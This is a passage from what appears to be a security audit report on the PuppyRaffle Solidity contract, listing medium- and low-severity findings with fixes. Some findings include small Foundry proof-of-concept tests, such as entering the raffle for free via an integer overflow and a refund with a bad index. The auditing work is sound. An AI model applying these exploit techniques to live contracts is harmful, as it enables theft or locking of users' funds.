[FAIL. Reason: PuppyRaffle: There are currently players active!] testWithdrawFees() (gas: 361718)
Test result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.40ms
```
Any small amount sent over by a self destructing contract will make `withdrawFees` function unusable, leaving no other way of taking the fees out of the contract.

## Impact

All fees that weren't withdrawn and all future fees are stuck in the contract.

## Tools Used

Manual review

## Recommendations

Avoid using `address(this).balance` in this way as it can easily be changed by an attacker. Properly track the `totalFees` and withdraw it.

```diff
    function withdrawFees() external {
--      require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```
## <a id='M-03'></a>M-03. Impossible to win raffle if the winner is a smart contract without a fallback function

_Submitted by [0xethanol](/profile/clk5f1wwv0000mo08qcnt8byt), [ararara](/profile/clntr7eq20000ia08oode1zz7), [asimaranov](/profile/clo4plnc4001mmi08szfoggg0), [nuthan2x](/profile/clnu96508000wl1084ehhgiyg), [Chandr](/profile/clka007jd0000k2086j3juoi9), [0xVinylDavyl](/profile/clkeaiat40000l309ruc9obdh), [zhuying](/profile/clk5hy2a0000ajy087yh41k20), [Marcologonz](/profile/clo2jvaqo0006mf08co9ntqpt), [happyformerlawyer](/profile/clmca6fy60000mp08og4j1koc), [Ciara](/profile/clnvs09md0006jx08tmvz0w19). Selected submission by: [0xethanol](/profile/clk5f1wwv0000mo08qcnt8byt)._      
				


## Summary

If a player submits a smart contract as a player, and if it doesn't implement the `receive()` or `fallback()` function, the call use to send the funds to the winner will fail to execute, compromising the functionality of the protocol.

## Vulnerability Details

The vulnerability comes from the way that are programmed smart contracts, if the smart contract doesn't implement a `receive() payable` or `fallback() payable` functions, it is not possible to send ether to the program.


## Impact

High - Medium: The protocol won't be able to select a winner but players will be able to withdraw funds with the `refund()` function


## Recommendations

Restrict access to the raffle to only EOAs (Externally Owned Accounts), by checking if the passed address in enterRaffle is a smart contract, if it is we revert the transaction.

We can easily implement this check into the function because of the Adress library from OppenZeppelin.

I'll add this replace `enterRaffle()` with these lines of code:

```solidity

function enterRaffle(address[] memory newPlayers) public payable {
   require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
   for (uint256 i = 0; i < newPlayers.length; i++) {
      require(Address.isContract(newPlayers[i]) == false, "The players need to be EOAs");
      players.push(newPlayers[i]);
   }

   // Check for duplicates
   for (uint256 i = 0; i < players.length - 1; i++) {
       for (uint256 j = i + 1; j < players.length; j++) {
           require(players[i] != players[j], "PuppyRaffle: Duplicate player");
       }
   }

   emit RaffleEnter(newPlayers);
}
``` 



# Low Risk Findings

## <a id='L-01'></a>L-01. Ambiguous index returned from PuppyRaffle::getActivePlayerIndex(address), leading to possible refund failures

_Submitted by [shikhar229169](/profile/clk3yh639002emf08ywok1hzf), [happyformerlawyer](/profile/clmca6fy60000mp08og4j1koc), [InAllHonesty](/profile/clkgm90b9000gms085g528phk), [Timenov](/profile/clkuwlybw001wmk08os9pfnd1), [efecarranza](/profile/clnu83dx3000jl1088pfm1okk), [ararara](/profile/clntr7eq20000ia08oode1zz7), [C0D30](/profile/clnjbh3c10000l7086io4m3vl), [nisedo](/profile/clk3saar60000l608gsamuvnw), [anjalit](/profile/cllp2b2js0000l108bfqql9at), [0xethanol](/profile/clk5f1wwv0000mo08qcnt8byt), [theirrationalone](/profile/clk46mun70016l5082te0md5t), [naman1729](/profile/clk41lnhu005wla08y1k4zaom), [banditxbt](/profile/clob62zxy0000l3088imc9gu4), [wallebach](/profile/clntzn5gl0000lg08239tslcp), [y0ng0p3](/profile/clk4ouhib000al808roszkn4e), [nuthan2x](/profile/clnu96508000wl1084ehhgiyg), [Silverwind](/profile/clld9fbfq0000l908smg5kh8s), [Chandr](/profile/clka007jd0000k2086j3juoi9), [KiteWeb3](/profile/clk9pzw3j000smh08313lj91l), [Ryonen](/profile/clk88agkq000yl708e571tu1b), [0x4non](/profile/clk3udrho0004mb08dm6y7y17), [BowTiedJerboa](/profile/cloc8261b001al208obsdjnwj), [uint256vieet](/profile/clkxj0sw20028l0085e7qx21j), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [0xTheBlackPanther](/profile/clnca1ftl0000lf08bfytq099), [aethrouzz](/profile/clmx62ogr0000l90843cr8gtz), [Osora9](/profile/clnvjxx5m0002mr08m4o4dl44), [AnouarBF](/profile/clo3tpz750000l508wc1jr5jc), [0xspryon](/profile/clo19fw280000mf08c4yazene), [KrisRenZo](/profile/cln34hwg10000ld09wex2xukq), [zhuying](/profile/clk5hy2a0000ajy087yh41k20), [TheCodingCanuck](/profile/clkg5xveq0000i9082f9kiksa), [n0kto](/profile/clm0jkw6w0000jv08gaj4hof4), [MikeDougherty](/profile/clnuc4zbb000cl508b6gnobqi), [ironcladmerc](/profile/clnue0hoa0006ky08p2fc7lv5), [0xAbhay](/profile/clnwpdjb00006jr088q416aog), [Equious](/profile/clldzdkk60000mr082grbuj97), [silvana](/profile/clnurvzom000kmj08hko9u6dv), [Bigor](/profile/clny88ad5000ol9081zmfw656), [Ciara](/profile/clnvs09md0006jx08tmvz0w19), [ezerez](/profile/clnueax9c000ll408f0qz7sa2), [ETHANHUNTIMF99](/profile/clnw21fzq0003le08a70dcond), [jasmine](/profile/clkarmt9n0000l908usstgujw), [0xjarix](/profile/clmjdxnit0000mo08j0t9g44h), [Louis](/profile/clloixi3x0000la08i46r5hc8), [Hueber](/profile/clnu9gz9k0006l609yi4yh7rg), [Heba](/profile/clo3cb5nv000mmj087plzmqy8). Selected submission by: [MikeDougherty](/profile/clnuc4zbb000cl508b6gnobqi)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/e01ef1124677fb78249602a171b994e1f48a1298/src/PuppyRaffle.sol#L116

## Summary

The `PuppyRaffle::getActivePlayerIndex(address)` returns `0` when the index of this player's address is not found, which is the same as if the player would have been found in the first element in the array. This can trick calling logic to think the address was found and then attempt to execute a `PuppyRaffle::refund(uint256)`. 

## Vulnerability Details

The `PuppyRaffle::refund()` function requires the index of the player's address to preform the requested refund.

```solidity
/// @param playerIndex the index of the player to refund. You can find it externally by calling `getActivePlayerIndex`
function refund(uint256 playerIndex) public;
```

In order to have this index, `PuppyRaffle::getActivePlayerIndex(address)` must be used to learn the correct value.

```solidity
/// @notice a way to get the index in the array
/// @param player the address of a player in the raffle
/// @return the index of the player in the array, if they are not active, it returns 0
function getActivePlayerIndex(address player) external view returns (int256) {
    // find the index... 
    // if not found, then...
    return 0;
}
```
The logic in this function returns `0` as the default, which is as stated in the `@return` NatSpec. However, this can create an issue when the calling logic checks the value and naturally assumes `0` is a valid index that points to the first element in the array. When the players array has at two or more players, calling `PuppyRaffle::refund()` with the incorrect index will result in a normal revert with the message "PuppyRaffle: Only the player can refund", which is fine and obviously expected. 

On the other hand, in the event a user attempts to perform a `PuppyRaffle::refund()` before a player has been added the EvmError will likely cause an outrageously large gas fee to be charged to the user.  

This test case can demonstrate the issue: 

```solidity
function testRefundWhenIndexIsOutOfBounds() public {
    int256 playerIndex = puppyRaffle.getActivePlayerIndex(playerOne);
    vm.prank(playerOne);
    puppyRaffle.refund(uint256(playerIndex));
}
```

The results of running this one test show about 9 ETH in gas:

```text
Running 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
[FAIL. Reason: EvmError: Revert] testRefundWhenIndexIsOutOfBounds() (gas: 9079256848778899449)
Test result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 914.01µs
```

Additionally, in the very unlikely event that the first player to have entered attempts to preform a `PuppyRaffle::refund()` for another user who has not already entered the raffle, they will unwittingly refund their own entry. A scenario whereby this might happen would be if `playerOne` entered the raffle for themselves and 10 friends. Thinking that `nonPlayerEleven` had been included in the original list and has subsequently requested a `PuppyRaffle::refund()`. Accommodating the request, `playerOne` gets the index for `nonPlayerEleven`. Since the address does not exist as a player, `0` is returned to `playerOne` who then calls `PuppyRaffle::refund()`, thereby refunding their own entry.   

## Impact

1. Exorbitantly high gas fees charged to user who might inadvertently request a refund before players have entered the raffle.
2. Inadvertent refunds given based in incorrect `playerIndex`.  

## Tools Used

Manual Review and Foundry

## Recommendations

1. Ideally, the whole process can be simplified. Since only the `msg.sender` can request a refund for themselves, there is no reason why `PuppyRaffle::refund()` cannot do the entire process in one call. Consider refactoring and implementing the `PuppyRaffle::refund()` function in this manner:

```solidity
/// @dev This function will allow there to be blank spots in the array
function refund() public {
    require(_isActivePlayer(), "PuppyRaffle: Player is not active");
    address playerAddress = msg.sender;

    payable(msg.sender).sendValue(entranceFee);

    for (uint256 playerIndex = 0; playerIndex < players.length; ++playerIndex) {
        if (players[playerIndex] == playerAddress) {
            players[playerIndex] = address(0);
        }
    }
    delete existingAddress[playerAddress];
    emit RaffleRefunded(playerAddress);
}
```
Which happens to take advantage of the existing and currently unused `PuppyRaffle::_isActivePlayer()` and eliminates the need for the index altogether.

2. Alternatively, if the existing process is necessary for the business case, then consider refactoring the `PuppyRaffle::getActivePlayerIndex(address)` function to return something other than a `uint` that could be mistaken for a valid array index.  

```diff
+    int256 public constant INDEX_NOT_FOUND = -1;
+    function getActivePlayerIndex(address player) external view returns (int256) {
-    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return int256(i);
            }
        }
-        return 0;
+        return INDEX_NOT_FOUND;
    }

    function refund(uint256 playerIndex) public {
+        require(playerIndex < players.length, "PuppyRaffle: No player for index");

```
## <a id='L-02'></a>L-02. Missing `WinnerSelected`/`FeesWithdrawn` event emition in `PuppyRaffle::selectWinner`/`PuppyRaffle::withdrawFees` methods

_Submitted by [ZedBlockchain](/profile/clk6kgukh0008ld088n5wns9l), [Timenov](/profile/clkuwlybw001wmk08os9pfnd1), [merlinboii](/profile/clnxnj1ow000ll008rx7zrb8h), [Eric](/profile/clkbqsa510000mi082he56qby), [ararara](/profile/clntr7eq20000ia08oode1zz7), [pacelliv](/profile/clk45g5zs003smg08s6utu2a0), [Ryonen](/profile/clk88agkq000yl708e571tu1b), [0xspryon](/profile/clo19fw280000mf08c4yazene), [KrisRenZo](/profile/cln34hwg10000ld09wex2xukq), [SecurityDev23](/profile/clk46s8m10022la08qgfsxkfu), [y0ng0p3](/profile/clk4ouhib000al808roszkn4e), [yeahChibyke](/profile/clk40bik4000wjl087tjqrtti), [EmanHerawy](/profile/cllknyev7000alc087jsf4zi2). Selected submission by: [0xspryon](/profile/clo19fw280000mf08c4yazene)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L154

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L162

## Summary

Events for critical state changes (e.g. owner and other critical parameters like a winner selection or the fees withdrawn) should be emitted for tracking this off-chain

## Tools Used

Manual review

## Recommendations

Add a WinnerSelected event that takes as parameter the currentWinner and the minted token id and emit this event in `PuppyRaffle::selectWinner` right after the call to [`_safeMing_`](https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L153)

Add a FeesWithdrawn event that takes as parameter the amount withdrawn and emit this event in `PuppyRaffle::withdrawFees` right at the end of [the method](https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L162)
## <a id='L-03'></a>L-03. Participants are mislead by the rarity chances.

_Submitted by [InAllHonesty](/profile/clkgm90b9000gms085g528phk), [Ryonen](/profile/clk88agkq000yl708e571tu1b), [Awacs](/profile/clo47qxsq001dm808b0vjbta1), [0xSCSamurai](/profile/clk41wibj006sla08llbkfxxu), [uint256vieet](/profile/clkxj0sw20028l0085e7qx21j), [Dutch](/profile/clnvncrk9000il408ns2kcgj6), [Ciara](/profile/clnvs09md0006jx08tmvz0w19). Selected submission by: [InAllHonesty](/profile/clkgm90b9000gms085g528phk)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L37-L50

https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L138-L146

## Summary

The drop chances defined in the state variables section for the COMMON and LEGENDARY are misleading.

## Vulnerability Details
The 3 rarity scores are defined as follows:

```
    uint256 public constant COMMON_RARITY = 70;
    uint256 public constant RARE_RARITY = 25;
    uint256 public constant LEGENDARY_RARITY = 5;
```

This implies that out of a really big number of NFT's, 70% should be of common rarity, 25% should be of rare rarity and the last 5% should be legendary. The `selectWinners` function doesn't implement these numbers.

```
        uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
        if (rarity <= COMMON_RARITY) {
            tokenIdToRarity[tokenId] = COMMON_RARITY;
        } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
            tokenIdToRarity[tokenId] = RARE_RARITY;
        } else {
            tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
        }
```

The `rarity` variable in the code above has a possible range of values within [0;99] (inclusive)
This means that `rarity <= COMMON_RARITY` condition will apply for the interval [0:70], the `rarity <= COMMON_RARITY + RARE_RARITY` condition will apply for the [71:95] rarity and the rest of the interval [96:99] will be of `LEGENDARY_RARITY`

The [0:70] interval contains 71 numbers `(70 - 0 + 1)`

The [71:95] interval contains 25 numbers `(95 - 71 + 1)`

The [96:99] interval contains 4 numbers `(99 - 96 + 1)`

This means there is a 71% chance someone draws a COMMON NFT, 25% for a RARE NFT and 4% for a LEGENDARY NFT.

## Impact

Depending on the info presented, the raffle participants might be lied with respect to the chances they have to draw a legendary NFT.

## Tools Used

Manual review

## Recommendations

Drop the `=` sign from both conditions:

```diff
--      if (rarity <= COMMON_RARITY) {
++      if (rarity < COMMON_RARITY) {
            tokenIdToRarity[tokenId] = COMMON_RARITY;
--      } else if (rarity <= COMMON_RARITY + RARE_RARITY) {
++      } else if (rarity < COMMON_RARITY + RARE_RARITY) {
            tokenIdToRarity[tokenId] = RARE_RARITY;
        } else {
            tokenIdToRarity[tokenId] = LEGENDARY_RARITY;
        }
```
## <a id='L-04'></a>L-04. PuppyRaffle::selectWinner() - L126: should use `>` instead of `>=`, because `raffleStartTime + raffleDuration` still represents an active raffle.

_Submitted by [0xSCSamurai](/profile/clk41wibj006sla08llbkfxxu), [ararara](/profile/clntr7eq20000ia08oode1zz7). Selected submission by: [0xSCSamurai](/profile/clk41wibj006sla08llbkfxxu)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L126

## Summary

In the PuppyRaffle::`selectWinner()` function, it's advisable to replace the condition `>=` with `>`. The raffle officially concludes when `block.timestamp` exceeds `raffleStartTime + raffleDuration`. Since block timestamps don't consistently occur every second, there's a risk that `block.timestamp` might be equal to `raffleStartTime + raffleDuration` while the raffle is still technically active, especially when using `>=`. To ensure the raffle is truly over, it's recommended to use the condition `> raffleStartTime + raffleDuration`.

## Vulnerability Details

Technically speaking, the raffle has officially ended, i.e. not active anymore, once `time > raffleStartTime + raffleDuration`.
And since a new `block.timestamp` doesn't consistently happen every single moment or second, there is the risk of current `block.timestamp` being equal to `raffleStartTime + raffleDuration` while the raffle is technically still active, for the case where we use `>=`:
```solidity
require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```
But the raffle is not over at `== raffleStartTime + raffleDuration`, it is only technically over at `> raffleStartTime + raffleDuration`.

All in all, it would potentially make it possible to end the raffle and select the winner in the same block, which is unlikely to be the intention of the project. Generally we would want the winner to be selected at least in the next block after the raffle ended, to be sure we dont invite any related potential edge cases that way.

## Impact

Edge case where winner is selected at the same time the raffle is technically still active, as well as selecting winner in same block as when raffle ends.

Deemed low for now but I suspect it could be a medium risk issue, especially if we start involving miners/mev bots who intentionally target this "vulnerability".

## Tools Used
VSC.

## Recommendations

```solidity
require(block.timestamp > raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

## <a id='L-05'></a>L-05. Total entrance fee can overflow leading to the user paying little to nothing

_Submitted by [robbiesumner](/profile/clk7cxmsg000klc08n5r6wgfc), [Ryonen](/profile/clk88agkq000yl708e571tu1b), [0x4non](/profile/clk3udrho0004mb08dm6y7y17), [n0kto](/profile/clm0jkw6w0000jv08gaj4hof4), [Louis](/profile/clloixi3x0000la08i46r5hc8). Selected submission by: [robbiesumner](/profile/clk7cxmsg000klc08n5r6wgfc)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L80

## Summary

Calling `PuppyRaffle::enterRaffle` with many addresses results in the user paying a very little fee and gaining an unproportional amount of entries.

## Vulnerability Details

`PuppyRaffle::enterRaffle` does not check for an overflow. If a user inputs many addresses that multiplied with `entranceFee` would exceed `type(uint256).max` the checked amount for `msg.value` overflows back to 0.

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
=>  require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    ...
```

To see for yourself, you can paste this function into `PuppyRaffleTest.t.sol` and run `forge test --mt testCanEnterManyAndPayLess`.
```solidity
function testCanEnterManyAndPayLess() public {
        uint256 entranceFee = type(uint256).max / 2 + 1; // half of max value
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );

        address[] memory players = new address[](2); // enter two players
        players[0] = playerOne;
        players[1] = playerTwo;

        puppyRaffle.enterRaffle{value: 0}(players); // user pays no fee
    }
```

This solidity test provides an example for an entranceFee that is slightly above half the max `uint256` value. The user can input two addresses and pay no fee. You could imagine the same working with lower base entrance fees and a longer address array.


## Impact

This is a critical high-severity vulnerability as anyone could enter multiple addresses and pay no fee, gaining an unfair advantage in this lottery.

Not only does the player gain an advantage in the lottery. The player could also just refund all of his positions and gain financially.

## Tools Used

- Manual review
- Foundry

## Recommendations
Revert the function call if `entranceFee * newPlayers.length` exceeds the `uint256` limit. Using openzeppelin's SafeMath library is also an option.

Generally it is recommended to use a newer solidity version as over-/underflows are checked by default in `solidity >=0.8.0`.
## <a id='L-06'></a>L-06. Fee should be 'totalAmountCollected-prizePool' to prevent decimal loss

_Submitted by [anarcheuz](/profile/clmrussuq0008l008ao5w04v1), [Y403L](/profile/clk451ae6001gl908aibvhwv9), [Ryonen](/profile/clk88agkq000yl708e571tu1b), [KrisRenZo](/profile/cln34hwg10000ld09wex2xukq), [ro1sharkm](/profile/clk56pzim0006l508uumuo4oq), [uint256vieet](/profile/clkxj0sw20028l0085e7qx21j), [innertia](/profile/clkqyrmqu000gkz08274w833n), [Awacs](/profile/clo47qxsq001dm808b0vjbta1), [00decree](/profile/clnge53mh0000jv08gajav1nt), [remedcu](/profile/clk3t0yen001smj084r0hn49p), [Ciara](/profile/clnvs09md0006jx08tmvz0w19). Selected submission by: [uint256vieet](/profile/clkxj0sw20028l0085e7qx21j)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-Puppy-Raffle/blob/07399f4d02520a2abf6f462c024842e495ca82e4/src/PuppyRaffle.sol#L133

## Summary
`fee` should be 'totalAmountCollected-prizePool' to prevent decimal loss

## Vulnerability Details
```
uint256 totalAmountCollected = players.length * entranceFee;
uint256 prizePool = (totalAmountCollected * 80) / 100;
uint256 fee = (totalAmountCollected * 20) / 100;
```
This formula calculates `fee` should be 'totalAmountCollected-prizePool'
## Impact
By calculates `fee` like the formula above can cause a loss in `totalAmountCollected' if the `prizePool` is rounded.


## Tools Used
Manual
Foundry
## Recommendations
```diff
- uint256 fee = (totalAmountCollected * 20) / 100;
+ uint256 fee = totalAmountCollected-prizePool;

```







